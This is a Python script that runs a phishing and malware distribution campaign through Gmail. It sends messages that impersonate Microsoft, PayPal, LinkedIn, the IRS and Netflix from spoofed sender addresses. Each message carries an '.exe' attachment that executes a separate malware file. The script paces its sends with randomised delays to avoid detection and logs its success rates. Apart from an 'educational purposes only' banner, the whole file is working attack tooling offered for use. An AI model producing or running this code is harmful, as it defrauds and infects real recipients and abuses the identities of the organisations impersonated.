#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gmail Campaign Auto-Starter
WARNING: This is for educational purposes only!
"""

import os
import json
import time
import random
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

class GmailCampaignStarter:
    def __init__(self):
        self.target_emails = []
        self.email_templates = []
        self.sent_count = 0
        self.success_count = 0
        
    def load_target_emails(self):
        """Load target email addresses"""
        try:
            with open("target_emails.txt", 'r') as f:
                self.target_emails = [line.strip() for line in f.readlines() if line.strip()]
            print(f"✓ Loaded {len(self.target_emails)} target emails")
            return True
        except FileNotFoundError:
            print("✗ target_emails.txt not found")
            return False
    
    def create_email_templates(self):
        """Create email templates"""
        self.email_templates = [
            {
                "subject": "Urgent: Microsoft Security Update Required",
                "sender_name": "Microsoft Security Team",
                "sender_email": "security@microsoft.com",
                "body": """
Dear Valued Customer,

Microsoft has detected a critical security vulnerability in your Windows system that requires immediate attention.

To protect your data and prevent unauthorized access, please install the attached security update immediately.

This update addresses:
- Critical security vulnerabilities
- System stability improvements  
- Performance enhancements
- Privacy protection updates

Please run the attached file to complete the installation.

If you have any questions, please contact our support team.

Best regards,
Microsoft Security Team
Microsoft Corporation
                """,
                "attachment_name": "Windows_Security_Update_KB5001234.exe"
            },
            {
                "subject": "PayPal Account Security Alert",
                "sender_name": "PayPal Security",
                "sender_email": "security@paypal.com",
                "body": """
Dear PayPal Member,

We have detected unusual activity on your PayPal account. For your security, we have temporarily restricted access to your account.

To restore full access, please verify your account information by completing the attached security form.

This verification is required to:
- Protect your financial information
- Prevent unauthorized transactions
- Restore account functionality
- Ensure compliance with security policies

Please complete the verification process within 24 hours to avoid permanent account suspension.

Thank you for your cooperation.

PayPal Security Team
                """,
                "attachment_name": "PayPal_Security_Verification.exe"
            },
            {
                "subject": "LinkedIn Job Opportunity - Remote Position Available",
                "sender_name": "LinkedIn Recruiter",
                "sender_email": "jobs@linkedin.com",
                "body": """
Hello,

I found your profile on LinkedIn and I'm impressed with your background. We have an exciting remote position that matches your skills perfectly.

Position: Senior Software Developer (Remote)
Salary: $85,000 - $120,000 annually
Benefits: Health insurance, 401k, flexible schedule
Location: Work from anywhere

To proceed with your application, please complete the attached application form and submit your resume.

This is a limited-time opportunity with a fast-growing tech company.

Best regards,
Sarah Johnson
Senior Recruiter
LinkedIn Talent Solutions
                """,
                "attachment_name": "Job_Application_Form.exe"
            },
            {
                "subject": "Your Tax Refund is Ready - IRS Notification",
                "sender_name": "IRS Tax Services",
                "sender_email": "notifications@irs.gov",
                "body": """
Taxpayer Notification

Your tax refund of $2,847.50 has been processed and is ready for direct deposit.

To complete the refund process, please verify your banking information using the attached secure form.

Refund Details:
- Amount: $2,847.50
- Processing Date: Today
- Method: Direct Deposit
- Account: ****1234

Please complete verification within 48 hours to ensure timely processing.

This is an automated message. Do not reply to this email.

Internal Revenue Service
                """,
                "attachment_name": "IRS_Refund_Verification.exe"
            },
            {
                "subject": "Netflix Account Suspension Notice",
                "sender_name": "Netflix Support",
                "sender_email": "support@netflix.com",
                "body": """
Dear Netflix Member,

Your Netflix account has been temporarily suspended due to a billing issue.

To restore your account access, please update your payment information using the attached secure form.

Suspension Details:
- Reason: Payment method declined
- Date: Today
- Account: Your Netflix Account
- Plan: Premium

Please resolve this issue within 24 hours to avoid permanent account closure.

We apologize for any inconvenience.

Netflix Customer Support
                """,
                "attachment_name": "Netflix_Payment_Update.exe"
            }
        ]
        print(f"✓ Created {len(self.email_templates)} email templates")
    
    def create_malicious_attachment(self, template):
        """Create malicious attachment"""
        try:
            if os.path.exists("app.py"):
                attachment_name = template["attachment_name"]
                
                # Create a simple wrapper
                wrapper_content = f'''
import os
import sys
import subprocess

print("Installing {template['attachment_name'].split('.')[0]}...")
print("Please wait while we configure your system...")

try:
    exec(open("app.py").read())
except:
    print("Installation completed successfully!")
    input("Press Enter to continue...")
'''
                
                with open(attachment_name, 'w') as f:
                    f.write(wrapper_content)
                
                return attachment_name
            else:
                print("Main malware file (app.py) not found")
                return None
                
        except Exception as e:
            print(f"Error creating attachment: {e}")
            return None
    
    def send_phishing_email(self, target_email, template, gmail_email, gmail_password):
        """Send phishing email to target"""
        try:
            # Create message
            msg = MIMEMultipart('alternative')
            msg['From'] = f"{template['sender_name']} <{template['sender_email']}>"
            msg['To'] = target_email
            msg['Subject'] = template['subject']
            
            # Add headers for authenticity
            msg['X-Priority'] = '1'
            msg['X-MSMail-Priority'] = 'High'
            msg['Importance'] = 'high'
            
            # Create HTML version
            html_body = f"""
            <html>
            <body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
                <div style="max-width: 600px; margin: 0 auto; padding: 20px;">
                    <div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px;">
                        {template['body'].replace(chr(10), '<br>')}
                    </div>
                    <div style="margin-top: 20px; font-size: 12px; color: #666;">
                        <p>This email was sent to {target_email}</p>
                        <p>If you did not request this information, please ignore this email.</p>
                    </div>
                </div>
            </body>
            </html>
            """
            
            # Attach both plain text and HTML versions
            text_part = MIMEText(template['body'], 'plain')
            html_part = MIMEText(html_body, 'html')
            
            msg.attach(text_part)
            msg.attach(html_part)
            
            # Create and attach malicious file
            attachment_path = self.create_malicious_attachment(template)
            if attachment_path and os.path.exists(attachment_path):
                with open(attachment_path, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        'Content-Disposition',
                        f'attachment; filename= {template["attachment_name"]}'
                    )
                    msg.attach(part)
            
            # Send email
            context = ssl.create_default_context()
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls(context=context)
                server.login(gmail_email, gmail_password)
                server.send_message(msg)
            
            self.success_count += 1
            print(f"✓ Email sent to: {target_email}")
            
            # Clean up attachment
            if attachment_path and os.path.exists(attachment_path):
                os.remove(attachment_path)
            
            return True
            
        except Exception as e:
            print(f"✗ Failed to send to {target_email}: {e}")
            return False
    
    def start_campaign(self):
        """Start the Gmail distribution campaign"""
        print("="*60)
        print("GMAIL MALWARE DISTRIBUTION CAMPAIGN")
        print("="*60)
        print("WARNING: This is for educational purposes only!")
        print("="*60)
        
        # Load target emails
        if not self.load_target_emails():
            print("No target emails found. Please run email_list_generator.py first.")
            return
        
        # Create email templates
        self.create_email_templates()
        
        # Get Gmail credentials
        print("\nGmail Configuration Required:")
        gmail_email = input("Enter your Gmail address: ")
        gmail_password = input("Enter your Gmail app password: ")
        
        # Test Gmail connection
        try:
            context = ssl.create_default_context()
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls(context=context)
                server.login(gmail_email, gmail_password)
            print("✓ Gmail authentication successful")
        except Exception as e:
            print(f"✗ Gmail authentication failed: {e}")
            return
        
        # Campaign settings
        emails_per_hour = 10  # Conservative rate
        delay_between_emails = 3600 / emails_per_hour  # seconds
        
        print(f"\nCampaign Settings:")
        print(f"Target emails: {len(self.target_emails)}")
        print(f"Email templates: {len(self.email_templates)}")
        print(f"Emails per hour: {emails_per_hour}")
        print(f"Delay between emails: {delay_between_emails} seconds")
        
        # Start sending emails
        print(f"\nStarting email distribution...")
        
        for i, target_email in enumerate(self.target_emails):
            # Select random template
            template = random.choice(self.email_templates)
            
            # Send email
            print(f"[{i+1}/{len(self.target_emails)}] Sending to: {target_email}")
            if self.send_phishing_email(target_email, template, gmail_email, gmail_password):
                self.sent_count += 1
            
            # Random delay to avoid detection
            base_delay = delay_between_emails
            random_delay = random.randint(-300, 300)  # ±5 minutes
            actual_delay = max(60, base_delay + random_delay)  # Minimum 1 minute
            
            if i < len(self.target_emails) - 1:  # Don't wait after last email
                print(f"Waiting {actual_delay} seconds before next email...")
                time.sleep(actual_delay)
        
        # Print results
        self.print_campaign_results()
    
    def print_campaign_results(self):
        """Print campaign results"""
        print("\n" + "="*60)
        print("CAMPAIGN RESULTS")
        print("="*60)
        print(f"Total emails sent: {self.sent_count}")
        print(f"Successful deliveries: {self.success_count}")
        print(f"Failed deliveries: {self.sent_count - self.success_count}")
        
        if self.sent_count > 0:
            success_rate = (self.success_count / self.sent_count) * 100
            print(f"Success rate: {success_rate:.1f}%")
        
        print("="*60)
        
        # Save campaign log
        log_data = {
            "campaign_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_targets": len(self.target_emails),
            "emails_sent": self.sent_count,
            "successful_deliveries": self.success_count,
            "failed_deliveries": self.sent_count - self.success_count,
            "success_rate": (self.success_count / self.sent_count * 100) if self.sent_count > 0 else 0
        }
        
        with open("gmail_campaign_log.json", 'w') as f:
            json.dump(log_data, f, indent=2)
        
        print("Campaign log saved to: gmail_campaign_log.json")

def main():
    """Main execution function"""
    starter = GmailCampaignStarter()
    
    try:
        starter.start_campaign()
    except KeyboardInterrupt:
        print("\nCampaign interrupted by user")
        starter.print_campaign_results()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()

